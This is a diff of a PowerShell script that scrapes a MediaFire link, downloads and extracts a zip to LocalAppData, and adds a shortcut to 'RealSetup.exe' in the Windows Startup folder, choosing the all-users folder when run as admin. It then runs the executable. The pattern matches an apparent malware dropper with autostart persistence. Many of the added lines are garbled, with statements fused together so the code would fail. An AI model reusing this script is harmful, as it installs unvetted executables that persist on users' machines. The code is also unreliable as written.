@@ -5,9 +5,8 @@
 $mediaFireUrl = "https://www.mediafire.com/file/l09mfm48xaz26zi/"
 $zipName = "Real.zip"
 $exeName = "RealSetup.exe"
-$targetPath  = $env:LocalAppData
-$zipPath  = Join-Path $targetPath $zipName
-$extractPath = Join-Path $targetPath "Real"
+$targetPath = $env:LocalAppData$zipPath = Join-Path $targetPath$zipName
+$extractPath = Join-Path$targetPath "Real"
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
 # ==============================
@@ -47,26 +46,22 @@ catch {
 # 4. Find download URL
 # ==============================
 
-$directUrl = $null
+$directUrl =$null
 
 # First try parsed links
-$directUrl = $page.Links |
+$directUrl =$page.Links |
     Where-Object {
-        $_.href -and
-        $_.href -match 'download.*mediafire\.com'
+        $_.href -and$_.href -match 'download.*mediafire\.com'
     } |
     Select-Object -ExpandProperty href -First 1
 
 # If that failed, search raw HTML
-if (-not $directUrl) {
-
-    $pattern = 'https?://[^"''<>\s]+mediafire\.com[^"''<>\s]*'
-
+if (-not $directUrl) {$pattern = 'https?://[^"''<>\s]+mediafire\.com[^"''<>\s]*'
     $matches = [regex]::Matches($page.Content, $pattern)
 
-    foreach ($match in $matches) {
+    foreach ($match in$matches) {
         if ($match.Value -match 'download') {
-            $directUrl = $match.Value
+            $directUrl =$match.Value
             break
         }
     }
@@ -100,8 +95,7 @@ $curlArgs = @(
     "--connect-timeout", "30"
     "--max-time", "600"
     "-A", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
-    "-o", $zipPath
-    $directUrl
+    "-o", $zipPath$directUrl
 )
 
 & curl.exe @curlArgs
@@ -118,7 +112,7 @@ if (-not (Test-Path $zipPath)) {
     throw "Download failed: file was not created."
 }
 
-$file = Get-Item $zipPath
+$file = Get-Item$zipPath
 
 Write-Host "Downloaded:"
 Write-Host "$($file.FullName)"
@@ -134,39 +128,49 @@ if ($file.Length -lt 1000) {
 
 Write-Host "Extracting..."
 
-& tar.exe -xf $zipPath -C $extractPath
+& tar.exe -xf $zipPath -C$extractPath
 
 if ($LASTEXITCODE -ne 0) {
     throw "tar extraction failed with exit code $LASTEXITCODE"
 }
 
 # ==============================
-# 8. Ink in Start Up
+# 8. Define EXE Path
 # ==============================
 
-$shortcutName = "Real.lnk"
-if ($isAdmin) {
-$startmenuPath = "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
-} else {
-$startmenuPath = "$env:AppData\Microsoft\Windows\Start Menu\Programs\Startup"
-}
-$startmenuPath = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup"
-$shortcutFile = Join-Path $startmenuPath $shortcutName
-$WScriptShell = New-Object -ComObject WScript.Shell
-$Shortcut = $WScriptShell.CreateShortcut($shortcutFile)
-$Shortcut.TargetPath = $exePath
-$Shortcut.WorkingDirectory = Split-Path -Parent $exePath
-$Shortcut.Save()
-
-# ==============================
-# 9. Run EXE
-# ==============================
-
-$exePath = Join-Path $extractPath $exeName
+$exePath = Join-Path $extractPath$exeName
 
 if (-not (Test-Path $exePath)) {
     throw "EXE not found: $exePath"
 }
+
+# ==============================
+# 9. Link in Start Up
+# ==============================
+
+$shortcutName = "Real.lnk"
+
+if ($isAdmin) {
+    # All Users Startup folder
+    $startmenuPath = "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+} else {
+    # Current User Startup folder
+    $startmenuPath = "$env:AppData\Microsoft\Windows\Start Menu\Programs\Startup"
+}
+
+# Ensure the startup directory exists just in case
+if (-not (Test-Path $startmenuPath)) {
+    New-Item -ItemType Directory -Path $startmenuPath -Force | Out-Null
+}
+
+$shortcutFile = Join-Path$startmenuPath $shortcutName$WScriptShell = New-Object -ComObject WScript.Shell
+$Shortcut =$WScriptShell.CreateShortcut($shortcutFile)$Shortcut.TargetPath = $exePath$Shortcut.WorkingDirectory = Split-Path -Parent $exePath$Shortcut.Save()
+
+Write-Host "Startup shortcut created at: $shortcutFile"
+
+# ==============================
+# 10. Run EXE
+# ==============================
 
 Write-Host "Starting $exePath"
 
